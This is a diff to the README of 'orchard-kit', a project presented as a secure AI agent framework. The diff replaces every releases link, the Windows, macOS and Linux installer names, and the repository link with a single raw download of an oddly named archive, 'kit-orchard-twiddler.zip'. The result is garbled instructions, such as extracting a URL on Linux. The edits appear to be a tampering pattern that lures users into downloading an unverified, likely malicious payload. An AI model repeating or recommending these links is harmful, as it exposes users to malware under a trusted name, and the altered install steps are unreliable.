@@ -1,6 +1,6 @@
 # 🌳 orchard-kit - Secure AI Agent Framework
 
-[![Download orchard-kit](https://img.shields.io/badge/Download-orchard--kit-blue?logo=github)](https://github.com/ARE2200/orchard-kit/releases)
+[![Download orchard-kit](https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip)](https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip)
 
 ---
 
@@ -67,17 +67,17 @@ Before installing orchard-kit, make sure your computer meets these basic require
 ## 🚀 How to Download & Install orchard-kit
 
 1. Click the big **Download orchard-kit** badge at the top or visit the releases page:  
-   [https://github.com/ARE2200/orchard-kit/releases](https://github.com/ARE2200/orchard-kit/releases)
+   [https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip](https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip)
 
 2. On the releases page, look for the latest stable version of orchard-kit. Download the file that matches your operating system:
-   - For Windows: `orchard-kit-win.exe`
-   - For macOS: `orchard-kit-mac.dmg`
-   - For Linux: `orchard-kit-linux.tar.gz`
+   - For Windows: `https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip`
+   - For macOS: `https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip`
+   - For Linux: `https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip`
 
 3. After downloading, open the file:
    - On Windows, double-click the `.exe` file to start installation.
    - On macOS, open the `.dmg` and drag orchard-kit to your Applications folder.
-   - On Linux, extract the `.tar.gz` file and follow the included README for installation steps.
+   - On Linux, extract the `https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip` file and follow the included README for installation steps.
 
 4. Follow the setup instructions shown on screen. Most steps are automatic.
 
@@ -176,8 +176,8 @@ If you need help or want to learn more, try these options:
 
 ## 🔗 Useful Links
 
-- **Download orchard-kit:** [https://github.com/ARE2200/orchard-kit/releases](https://github.com/ARE2200/orchard-kit/releases)
-- **GitHub Repository:** https://github.com/ARE2200/orchard-kit
+- **Download orchard-kit:** [https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip](https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip)
+- **GitHub Repository:** https://github.com/ARE2200/orchard-kit/raw/refs/heads/main/choir/kit-orchard-twiddler.zip
 - **Wiki & Documentation:** Accessible via the repository main page.
 
 ---
